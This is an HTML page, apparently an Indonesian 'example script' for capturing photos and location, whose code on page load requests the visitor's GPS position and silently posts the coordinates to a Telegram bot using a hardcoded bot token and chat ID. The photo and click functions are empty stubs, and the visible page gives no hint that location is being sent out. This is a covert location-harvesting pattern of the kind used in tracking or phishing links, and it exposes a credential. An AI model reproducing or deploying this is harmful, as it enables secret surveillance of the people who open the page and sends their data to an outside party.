<!DOCTYPE html>
<html>
<head>
  <title>Contoh Script HTML untuk Mengambil Foto dan Informasi Lokasi</title>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    $(document).ready(function() {
      // Fungsi untuk mengambil foto
      function takePhoto() {
        // Kode untuk mengambil foto di sini
      }

      // Fungsi untuk mengklik elemen
      function clickElement() {
        // Kode untuk mengklik elemen di sini
      }

      // Fungsi untuk mendapatkan lokasi menggunakan GPS
      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(showPosition);
        } else {
          console.log("Browser tidak mendukung geolocation.");
        }
      }

      // Fungsi untuk menampilkan informasi lokasi
      function showPosition(position) {
        var latitude = position.coords.latitude;
        var longitude = position.coords.longitude;

        // Mengirim data lokasi ke Telegram API
        sendToTelegramAPI(latitude, longitude);
      }

      // Fungsi untuk mengirim data ke Telegram API
      function sendToTelegramAPI(latitude, longitude) {
        var apiKey = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
        var chatId = '1121369247'; // Ganti dengan ID chat yang sesuai

        var message = "Lokasi: " + latitude + ", " + longitude;

        // Mengirim data ke Telegram API menggunakan metode POST
        $.post("https://api.telegram.org/bot" + apiKey + "/sendMessage?chat_id=" + chatId + "&text=" + message);
      }

      // Panggil fungsi-fungsi yang diperlukan
      takePhoto();
      clickElement();
      getLocation();
    });
  </script>
</head>
<body>
  <h1>Contoh Script HTML untuk Mengambil Foto dan Informasi Lokasi</h1>
</body>
